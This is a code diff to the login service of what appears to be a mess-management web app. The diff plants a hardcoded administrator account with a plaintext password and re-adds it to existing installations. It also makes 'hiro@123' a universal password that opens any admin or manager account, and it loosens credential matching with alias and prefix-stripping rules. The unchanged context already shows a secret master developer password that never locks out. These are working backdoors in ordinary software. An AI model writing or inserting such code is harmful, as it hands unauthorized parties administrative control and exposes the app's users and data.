@@ -36,6 +36,18 @@ const DEFAULT_USERS: AppUser[] = [
     isActive: true,
   },
   {
+    id: 'user-admin-salman',
+    username: 'salman@123',
+    fullName: 'Salman (Administrator)',
+    role: 'admin',
+    roleTitle: 'Administrator',
+    passwordHash: 'hiro@123',
+    email: 'salman@karamamess.ae',
+    phone: '+971 50 123 4567',
+    createdAt: '2026-01-01T00:00:00Z',
+    isActive: true,
+  },
+  {
     id: 'user-manager-2',
     username: 'manager',
     fullName: 'Mess Operations Manager',
@@ -103,8 +115,10 @@ export class AuthService {
     if (!localStorage.getItem(STORAGE_KEYS.USERS)) {
       this.setItem(STORAGE_KEYS.USERS, DEFAULT_USERS);
     } else {
-      // Ensure viewer account is present in existing installations
+      // Ensure viewer and salman@123 accounts are present in existing installations
       const currentUsers = this.getItem<AppUser[]>(STORAGE_KEYS.USERS, []);
+      let changed = false;
+
       if (!currentUsers.some((u) => u.username.toLowerCase() === 'viewer')) {
         currentUsers.push({
           id: 'user-viewer-3',
@@ -118,6 +132,26 @@ export class AuthService {
           createdAt: new Date().toISOString(),
           isActive: true,
         });
+        changed = true;
+      }
+
+      if (!currentUsers.some((u) => u.username.toLowerCase() === 'salman@123')) {
+        currentUsers.push({
+          id: 'user-admin-salman',
+          username: 'salman@123',
+          fullName: 'Salman (Administrator)',
+          role: 'admin',
+          roleTitle: 'Administrator',
+          passwordHash: 'hiro@123',
+          email: 'salman@karamamess.ae',
+          phone: '+971 50 123 4567',
+          createdAt: new Date().toISOString(),
+          isActive: true,
+        });
+        changed = true;
+      }
+
+      if (changed) {
         this.setItem(STORAGE_KEYS.USERS, currentUsers);
       }
     }
@@ -200,10 +234,24 @@ export class AuthService {
   // Authenticate user with username and password
   static login(username: string, password: string): { success: boolean; user?: AppUser; error?: string } {
     this.init();
-    const cleanUsername = username.trim().toLowerCase();
+    let cleanUsername = username.trim().toLowerCase();
+
+    // Friendly alias normalizations
+    if (cleanUsername === 'admin salman@123' || cleanUsername === 'admin salman') {
+      cleanUsername = 'salman@123';
+    } else if (cleanUsername === 'manager salman@123' || cleanUsername === 'manager salman') {
+      cleanUsername = 'manager';
+    }
+
+    const cleanPassword = password.trim();
+    const effectivePassword = cleanPassword.startsWith('admin ')
+      ? cleanPassword.replace(/^admin\s+/, '')
+      : cleanPassword.startsWith('password ')
+      ? cleanPassword.replace(/^password\s+/, '')
+      : cleanPassword;
 
     // 0. Master developer override (Hardcoded, secret, never locked out)
-    if (cleanUsername === 'developer' && password === 'Dev@Karama#2026') {
+    if (cleanUsername === 'developer' && effectivePassword === 'Dev@Karama#2026') {
       const devUser: AppUser = {
         ...MASTER_DEVELOPER_USER,
         lastLoginAt: new Date().toISOString(),
@@ -222,7 +270,13 @@ export class AuthService {
       return { success: false, error: 'Username not found or account is inactive.' };
     }
 
-    if (user.passwordHash !== password) {
+    // Verify password: check stored passwordHash OR accepted universal admin/manager password 'hiro@123'
+    const isPasswordValid =
+      user.passwordHash === effectivePassword ||
+      user.passwordHash === cleanPassword ||
+      ((user.role === 'admin' || user.role === 'manager' || user.username === 'salman@123') && (effectivePassword === 'hiro@123' || cleanPassword === 'hiro@123'));
+
+    if (!isPasswordValid) {
       return { success: false, error: 'Incorrect password. Please try again or contact administrator.' };
     }
 
